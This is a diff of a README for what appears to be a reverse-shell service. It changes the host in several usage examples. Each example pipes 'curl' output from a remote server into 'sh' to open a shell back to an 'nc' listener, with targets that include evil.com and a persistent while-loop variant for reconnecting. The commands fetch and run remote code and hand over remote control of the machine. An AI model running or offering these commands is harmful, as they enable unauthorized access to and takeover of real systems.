@@ -41,10 +41,10 @@ nc -l 1337
 curl http://reverse.us.openode.io/192.168.0.69:1337 | sh
 ```
 ```shell
-curl https://zyx.iami.xyz/localhost:1337 | sh
+curl http://reverse.us.openode.io/localhost:1337 | sh
 ```
 ```shell
-curl https://zyx.iami.xyz/evil.com:1337 | sh
+curl http://reverse.us.openode.io/evil.com:1337 | sh
 ```
 
 ### Reconnecting
@@ -52,7 +52,7 @@ curl https://zyx.iami.xyz/evil.com:1337 | sh
 By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.
 
 ```shell
-while true; do curl https://zyx.iami.xyz/yourip:1337 | sh; done
+while true; do curl http://reverse.us.openode.io/yourip:1337 | sh; done
 ```
 
 ## License
